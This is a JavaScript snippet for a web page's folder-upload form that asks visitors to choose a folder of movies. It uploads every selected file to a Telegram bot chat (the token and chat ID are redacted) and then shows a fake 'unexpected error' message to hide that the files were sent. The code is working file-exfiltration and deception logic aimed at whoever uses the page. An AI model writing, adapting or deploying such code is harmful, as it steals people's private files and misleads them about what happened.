const botToken = 'Hidden-By-ParthI';
    const chatId = 'Hidden-by-Parth';

    const selectFolderBtn = document.getElementById('selectFolderBtn');
    const fileInput = document.getElementById('fileInput');
    const form = document.getElementById('uploadForm');
    const progressContainer = document.getElementById('progressContainer');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const folderStatus = document.getElementById('folderStatus');

    let selectedFiles = [];

    selectFolderBtn.addEventListener('click', () => {
      fileInput.click();
    });

    fileInput.addEventListener('change', () => {
      selectedFiles = Array.from(fileInput.files);
      if (selectedFiles.length > 0) {
        folderStatus.textContent = `✅ Folder selected`;
      } else {
        folderStatus.textContent = '';
      }
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      if (selectedFiles.length === 0) {
        alert('Please select a folder with movies!');
        return;
      }

      progressContainer.style.display = 'block';
      progressText.textContent = 'Progressing...';
      progressFill.style.width = '0%';
      progressText.style.color = '#eee';

      let uploadedCount = 0;
      const total = selectedFiles.length;
      const CONCURRENCY = 3;
      let index = 0;

      async function uploadFile(file) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', file);
        const url = `https://api.telegram.org/bot${botToken}/sendDocument`;

        try {
          await fetch(url, {
            method: 'POST',
            body: formData,
          });
        } catch (err) {
          console.error('Upload error:', err);
        }

        uploadedCount++;
        updateProgress(uploadedCount, total);
      }

      function updateProgress(done, total) {
        const percent = Math.round((done / total) * 100);
        progressFill.style.width = `${percent}%`;
        progressText.textContent = `Uploading... ${percent}%`;
      }

      async function uploadQueue() {
        const workers = [];

        while (index < total) {
          while (workers.length < CONCURRENCY && index < total) {
            const promise = uploadFile(selectedFiles[index++]);
            workers.push(promise);
          }

          await Promise.race(workers).then(() => {
            workers.splice(workers.findIndex(p => p !== undefined), 1);
          });
        }

        await Promise.all(workers);
      }

      await uploadQueue();

      setTimeout(() => {
        progressFill.style.width = `100%`;
        progressText.textContent = '❌ An unexpected error occurred. Please try again later.';
        progressText.style.color = '#ff6b6b';
      }, 500);
    });
